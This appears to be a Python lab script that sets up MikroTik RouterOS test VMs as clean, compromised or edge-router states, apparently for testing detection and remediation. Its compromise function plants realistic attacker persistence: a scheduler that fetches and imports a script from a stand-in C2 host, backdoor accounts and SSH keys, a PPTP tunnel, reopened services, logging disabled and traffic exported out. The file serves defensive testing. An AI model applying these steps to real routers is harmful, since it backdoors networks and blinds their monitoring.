#!/usr/bin/env python3
"""Configure a RouterOS CHR lab VM over the API (lab use only).

  lab.py baseline <port-base> <identity>   onboarded, clean fleet device
  lab.py compromise <port-base>            add the September 2026 artifacts
  lab.py edge <port-base>                  add edge-router-like legitimate config
  lab.py show <port-base> <menu...>        print a menu, e.g. `ip service`

<port-base> is the VM's forward base from boot.sh (API-SSL on base+729,
plaintext API on base+728 until the baseline disables it). Logs in as admin;
`baseline` sets its password to LAB_ADMIN_PASSWORD (default `lab`). Never
point this at a real device. See tests/lab/README.md.
"""
import base64
import os
import ssl
import sys
import time
from pathlib import Path

import librouteros

REPO = Path(__file__).resolve().parents[2]
KEYS = REPO / "ansible" / "roles" / "routeros_baseline" / "files"
ADMIN_PW = os.environ.get("LAB_ADMIN_PASSWORD", "lab")
ANSIBLE_PW = os.environ.get("LAB_ANSIBLE_PASSWORD", "lab-ansible")
MKTXP_PW = os.environ.get("LAB_MKTXP_PASSWORD", "lab-mktxp")
COLLECTOR = os.environ.get("LAB_COLLECTOR", "10.0.2.2")  # QEMU user-net host


def connect(base):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_ciphers("DEFAULT:@SECLEVEL=1")
    for port, wrap in ((int(base) + 729, ctx.wrap_socket), (int(base) + 728, None)):
        for password in (ADMIN_PW, ""):
            try:
                return librouteros.connect("127.0.0.1", "admin", password, port=port, timeout=20,
                                           encoding="latin-1", ssl_wrapper=wrap)
            except librouteros.exceptions.TrapError:
                continue
            except OSError:
                break
    sys.exit("cannot log in as admin")


def run(api, path, cmd, **kw):
    return tuple(api.path(*path.split())(cmd, **kw))


def find(api, path, **match):
    return [r for r in api.path(*path.split()) if all(r.get(k) == v for k, v in match.items())]


def ensure(api, path, match, **values):
    rows = find(api, path, **match)
    if rows:
        run(api, path, "set", **{".id": rows[0][".id"]}, **values)
    else:
        run(api, path, "add", **match, **values)


def baseline(port, identity):
    api = connect(port)
    run(api, "user", "set", **{".id": find(api, "user", name="admin")[0][".id"]}, password=ADMIN_PW)
    run(api, "system identity", "set", name=identity)
    groups = {
        "netops-backup-ro": "ssh,read",
        "netops-backup-full": "ssh,read,sensitive",
        "mktxp_group": "api,read",
        "netops-ansible": "api,ssh,ftp,read,write,policy,test,romon",
    }
    for name, policy in groups.items():
        ensure(api, "user group", {"name": name}, policy=policy)
    users = {
        "ansible": ("netops-ansible", ANSIBLE_PW, KEYS / "ansible.pub"),
        "oxidized": ("netops-backup-ro", "x" + os.urandom(8).hex(), KEYS / "oxidized.pub"),
        "oxidized-full": ("netops-backup-full", "x" + os.urandom(8).hex(), KEYS / "oxidized-full.pub"),
        "mktxp": ("mktxp_group", MKTXP_PW, None),
    }
    operators = {"turnrye": None, "seichold": None, "ae5au": None}
    for name in operators:
        files = sorted((KEYS / "operators").glob(f"{name}_*.pub"))
        users[name] = ("full", "x" + os.urandom(8).hex(), files)
    present = {k.get("user") for k in api.path("user", "ssh-keys")}
    for name, (group, password, keys) in users.items():
        ensure(api, "user", {"name": name}, group=group, password=password)
        if name in present:
            continue
        for key in ([keys] if isinstance(keys, Path) else keys or []):
            run(api, "user ssh-keys", "add", user=name, key=key.read_text().strip())

    if not find(api, "certificate", name="api-ssl"):
        run(api, "certificate", "add", name="api-ssl", **{"common-name": identity, "key-size": "2048",
            "days-valid": "3650", "key-usage": "key-cert-sign,digital-signature,key-encipherment,tls-server"})
        run(api, "certificate", "sign", **{".id": find(api, "certificate", name="api-ssl")[0][".id"]})
        for _ in range(60):
            if any(c.get("private-key") for c in find(api, "certificate", name="api-ssl")):
                break
            time.sleep(1)
    svc = {r["name"]: r for r in api.path("ip", "service") if not r.get("dynamic")}
    for name in ("telnet", "ftp", "www", "www-ssl", "winbox", "api", "reverse-proxy"):
        if name in svc:
            run(api, "ip service", "set", **{".id": svc[name][".id"]}, disabled="yes")
    sources = os.environ.get("LAB_SOURCES", "10.0.2.0/24,44.34.128.45/32")
    run(api, "ip service", "set", **{".id": svc["ssh"][".id"]}, port="222", address=sources)
    run(api, "ip service", "set", **{".id": svc["api-ssl"][".id"]}, certificate="api-ssl",
        address=sources, disabled="no")
    run(api, "ip ssh", "set", **{"strong-crypto": "yes", "password-authentication": "no",
                                 "forwarding-enabled": "no"})
    run(api, "ip dns", "set", servers="44.34.132.1,44.34.133.1,1.1.1.1,1.0.0.1",
        **{"allow-remote-requests": "no"})
    run(api, "ip cloud", "set", **{"ddns-enabled": "auto"})  # 7.17+: yes|auto only
    ensure(api, "system logging action", {"name": "remote"}, target="remote", remote=COLLECTOR,
           **{"remote-port": "514", "remote-log-format": "syslog"})
    for topic in ("system", "error", "warning", "critical", "account"):
        if not find(api, "system logging", action="remote", topics=topic):
            run(api, "system logging", "add", action="remote", topics=topic)
    run(api, "tool romon", "set", enabled="yes")
    print(f"baseline applied on :{port} ({identity})")


def compromise(port):
    """The September 2026 artifacts, from the categories in the design doc."""
    api = connect(port)
    for name, group in (("support", "full"), ("routeradmin", "full"), ("xadmqzpk", "full"),
                        ("admin1", "full")):
        ensure(api, "user", {"name": name}, group=group, password="hunter2" + name)
    # attacker key on an attacker account, and an extra key on an operator
    # throwaway keys generated for the lab; the private halves were discarded
    attacker = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOLbIuI8CiyPSJfmBhVmi9kYgtnGZUit5JZ8dph1fg71 ntp-service"
    run(api, "user ssh-keys", "add", user="support", key=attacker)
    run(api, "user ssh-keys", "add", user="turnrye",
        key="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBkWkExoi6YFgeyKr18W2f9JNLQFmzI7hthKsvvM+NcO ops@hermes")
    run(api, "system scheduler", "add", name="backup-sync", interval="1w",
        **{"on-event": '/tool fetch url="http://c2.example.invalid:8080/lab1/sync.rsc" dst-path=sync.rsc; /import sync.rsc'})
    run(api, "system scheduler", "add", name="cfg-check", **{"start-time": "startup",
        "on-event": "/user ssh-keys import public-key-file=ntp.pub user=support"})
    run(api, "system script", "add", name="autosupoutrif", source=':log info "x"')
    for name, body in (("sync.rsc", "/user add name=ops group=full"), ("ntp.pub", attacker),
                       ("redtail.arm7", "ELF"), ("setup.sh", "#!/bin/sh"), ("c6f53c3e.backup", "x"),
                       ("turnrye_rsa.pub", "ssh-rsa AAAA leftover")):
        run(api, "file", "add", name=name, contents=body)
    svc = {r["name"]: r for r in api.path("ip", "service") if not r.get("dynamic")}
    for name in ("telnet", "ftp", "www", "winbox", "api"):
        run(api, "ip service", "set", **{".id": svc[name][".id"]}, disabled="no", address="")
    run(api, "ip ssh", "set", **{"password-authentication": "yes", "forwarding-enabled": "both"})
    run(api, "ip pool", "add", name="P00LTP", ranges="10.10.10.2-10.10.10.254")
    run(api, "ppp profile", "add", name="ZPPTP", **{"local-address": "10.10.10.1", "remote-address": "P00LTP"})
    run(api, "ppp secret", "add", name="fn", password="123123", profile="ZPPTP", service="pptp")
    run(api, "interface pptp-server server", "set", enabled="yes", **{"default-profile": "ZPPTP"})
    run(api, "ip firewall nat", "add", chain="srcnat", action="masquerade",
        **{"src-address": "10.10.10.0/24"}, comment="Internet")
    run(api, "ip cloud", "set", **{"ddns-enabled": "yes"})
    run(api, "interface wireguard", "add", name="wg-x", **{"listen-port": "13231"})
    run(api, "interface wireguard peers", "add", interface="wg-x",
        **{"public-key": "dGhpcyBpcyBub3QgYSByZWFsIHdpcmVndWFyZCBrZXk=", "allowed-address": "10.200.0.2/32"})
    run(api, "ip address", "add", address="10.200.0.1/24", interface="wg-x")
    for i in range(3):
        run(api, "ip firewall filter", "add", chain="input", action="accept", protocol="tcp",
            **{"dst-port": str(8000 + i)}, comment=f"x-mgmt-{i}")
    remote = find(api, "system logging action", name="remote")[0]
    run(api, "system logging action", "set", **{".id": remote[".id"]}, remote="0.0.0.0")
    memory = find(api, "system logging action", name="memory")[0]
    run(api, "system logging action", "set", **{".id": memory[".id"]}, **{"memory-lines": "1"})
    for rule in find(api, "system logging", action="memory"):
        run(api, "system logging", "set", **{".id": rule[".id"]}, disabled="yes")
    run(api, "system logging", "add", topics="info", action="disk", disabled="yes")
    run(api, "ip dns", "set", servers="1.1.1.1,8.8.8.8", **{"allow-remote-requests": "yes"})
    run(api, "ip socks", "set", enabled="yes")
    run(api, "ip traffic-flow", "set", enabled="yes")
    run(api, "ip traffic-flow target", "add", **{"dst-address": "192.0.2.99", "port": "2055"})
    print(f"compromise artifacts added on :{port}")


def edge(port):
    """Legitimate config of the kind the edge router carries (filter rules,
    PPP accounts, an SSTP server, WireGuard peers, masquerade): remediation
    must keep all of it once the device's routeros_allow declares it."""
    api = connect(port)
    run(api, "ip firewall address-list", "add", list="mhw-routers", address="44.34.128.0/21")
    run(api, "ip firewall address-list", "add", list="mhw-admin", address="198.51.100.7")
    for i, (chain, action, extra) in enumerate((
            ("input", "accept", {"connection-state": "established,related"}),
            ("input", "accept", {"protocol": "tcp", "dst-port": "222", "src-address-list": "mhw-admin"}),
            ("input", "drop", {}),
            ("forward", "drop", {"src-address-list": "mhw-routers", "out-interface": "ether1"}),
            ("forward", "drop", {"dst-address-list": "mhw-routers", "in-interface": "ether1"}))):
        run(api, "ip firewall filter", "add", chain=chain, action=action, comment=f"edge-{i}", **extra)
    run(api, "ip firewall filter", "add", chain="forward", action="accept", protocol="gre")
    run(api, "ppp profile", "add", name="mhw-sstp", **{"local-address": "44.34.131.1"})
    for name in ("sco-sstp", "ftn-sstp", "operator-1"):
        run(api, "ppp secret", "add", name=name, password="lab-" + name, profile="mhw-sstp", service="sstp")
    run(api, "interface sstp-server server", "set", enabled="yes", **{"default-profile": "mhw-sstp"})
    run(api, "interface wireguard", "add", name="wg-mgmt", **{"listen-port": "51820"})
    for i in range(3):
        run(api, "interface wireguard peers", "add", interface="wg-mgmt", comment=f"operator-{i}",
            **{"public-key": base64.b64encode(bytes([65 + i]) * 32).decode(),
               "allowed-address": f"10.66.0.{10 + i}/32"})
    run(api, "ip address", "add", address="10.66.0.1/24", interface="wg-mgmt")
    run(api, "ip firewall nat", "add", chain="srcnat", action="masquerade",
        **{"src-address": "10.66.0.0/24"}, comment="wg-mgmt clients")
    print(f"edge config added on :{port}")


def show(port, menu):
    api = connect(port)
    for row in api.path(*menu):
        print(row)


if __name__ == "__main__":
    cmd, *args = sys.argv[1:] or ["help"]
    if cmd == "baseline":
        baseline(*args)
    elif cmd == "compromise":
        compromise(*args)
    elif cmd == "edge":
        edge(*args)
    elif cmd == "show":
        show(args[0], args[1:])
    else:
        sys.exit(__doc__)
